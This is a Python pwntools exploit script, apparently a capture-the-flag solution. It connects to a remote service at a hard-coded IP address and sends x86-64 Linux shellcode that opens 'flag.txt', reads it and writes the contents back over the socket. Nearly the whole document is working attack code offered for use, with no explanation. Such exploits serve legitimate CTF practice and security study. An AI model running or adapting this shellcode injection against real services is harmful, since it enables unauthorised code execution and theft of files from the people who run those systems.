from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

p = remote("143.110.186.64", 33218)

shellcode = asm(r"""
    /* Save socket FD passed in rdi */
    push rdi

    /* mmap buffer */
    mov rax, 9
    xor rdi, rdi
    mov rsi, 4096
    mov rdx, 7
    mov r10, 34
    mov r8, -1
    xor r9, r9
    syscall
    mov r12, rax

    /* 'flag.txt' */
    mov rax, 0x7478742e67616c66
    mov [r12], rax

    /* open("flag.txt", 0, 0) */
    mov rax, 2
    mov rdi, r12
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov r13, rax

    /* read(fd, r12+32, 100) */
    mov rax, 0
    mov rdi, r13
    lea rsi, [r12+32]
    mov rdx, 100
    syscall
    mov r14, rax

    /* restore socket FD from stack */
    pop rdi
    mov rax, 1
    lea rsi, [r12+32]
    mov rdx, r14
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
""")

p.recvuntil(b"What have you to offer:")
p.send(shellcode)

try:
    output = p.recv(timeout=3)
    if b"CSL{" in output:
        print("[+] Flag:", output.decode(errors='ignore').strip())
    else:
        print("[*] Output:")
        print(output.decode(errors='ignore'))
except:
    print("[-] Could not retrieve output.")

p.close()